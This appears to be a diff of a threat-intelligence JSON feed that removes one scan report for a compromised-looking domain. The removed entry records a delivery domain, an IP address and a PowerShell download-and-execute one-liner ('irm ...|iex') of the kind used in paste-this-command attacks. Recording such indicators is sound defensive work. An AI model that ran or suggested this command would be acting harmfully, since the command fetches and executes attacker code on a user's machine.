@@ -5082,27 +5082,5 @@
     ],
     "ReportId": "cmwndbx891w080oml29yh3d48",
     "ScannedAt": "2026-11-19T09:49:17.899000+00:00"
-  },
-  {
-    "UrlDomain": "ks-contractors.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "192.232.223.143"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/9a2a2d2a3afdee6f",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/9a2a2d2a3afdee6f'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/9a2a2d2a3afdee6f"
-    ],
-    "ReportId": "cmwncfvff1vtx0omlmny8da5y",
-    "ScannedAt": "2026-11-19T09:24:22.692000+00:00"
   }
 ]
